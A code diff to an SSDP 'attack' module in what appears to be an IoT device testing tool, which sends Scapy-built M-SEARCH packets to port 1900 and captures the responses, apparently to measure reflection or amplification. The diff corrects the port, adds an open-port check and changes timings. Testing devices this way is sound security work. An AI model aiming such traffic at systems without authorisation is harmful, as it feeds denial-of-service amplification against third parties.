@@ -28,6 +28,10 @@ class Ssdp(GenericAttack):
             result = {"status": "no open ports"}
             return
 
+        if 1900 not in self.device["vulnerable_ports"]["udp"]["open"]:
+            result = {"status": "no open ports"}
+            return
+
         self.running = True
         file_prefix = self.config["file_prefix"]
         filename = 'results/' + self.device['time'] + '/' + file_prefix + self.device['macAddress']   + '.pcap'
@@ -40,13 +44,14 @@ class Ssdp(GenericAttack):
         # udpS.start()
         # time.sleep(2)
 
+
         destAddr = '239.255.255.250'
         if self.config['type'] == 'unicast':
             destAddr = target
 
         #determine packet size
         SSDP_ADDR = destAddr; #
-        SSDP_PORT = 53;
+        SSDP_PORT = 1900;
         SSDP_MX = 1
         SSDP_ST = "ssdp:all"
 
@@ -61,23 +66,23 @@ class Ssdp(GenericAttack):
         packetCount = self.config['packet_count']
         initialPacketSize = packetCount * len(spoofed_packet)
 
-        for port in self.device["vulnerable_ports"]["udp"]["open"]:
-            for x in range(0, packetCount):
-                SSDP_ADDR = destAddr
-                SSDP_PORT = port;
-                SSDP_MX = 1
-                SSDP_ST = "ssdp:all"
+        # for port in self.device["vulnerable_ports"]["udp"]["open"]:
+        for x in range(0, packetCount):
+            SSDP_ADDR = destAddr
+            SSDP_PORT = 1900;
+            SSDP_MX = 1
+            SSDP_ST = "ssdp:all"
 
-                payload = "M-SEARCH * HTTP/1.1\r\n" + \
-                          "HOST: %s:%d\r\n" % (SSDP_ADDR, SSDP_PORT) + \
-                          "MAN: \"ssdp:discover\"\r\n" + \
-                          "MX: %d\r\n" % (SSDP_MX,) + \
-                          "ST: %s\r\n" % (SSDP_ST,) + "\r\n";
-                spoofed_packet = IP(dst=SSDP_ADDR) / UDP(sport=5001, dport=SSDP_PORT) / payload
-                send(spoofed_packet)
-                time.sleep(0.5)
+            payload = "M-SEARCH * HTTP/1.1\r\n" + \
+                      "HOST: %s:%d\r\n" % (SSDP_ADDR, SSDP_PORT) + \
+                      "MAN: \"ssdp:discover\"\r\n" + \
+                      "MX: %d\r\n" % (SSDP_MX,) + \
+                      "ST: %s\r\n" % (SSDP_ST,) + "\r\n";
+            spoofed_packet = IP(dst=SSDP_ADDR) / UDP(sport=5001, dport=SSDP_PORT) / payload
+            send(spoofed_packet)
+            time.sleep(1)
 
-        time.sleep(5)
+        time.sleep(10)
         self.terminateDump()
         # udpS.join()
 
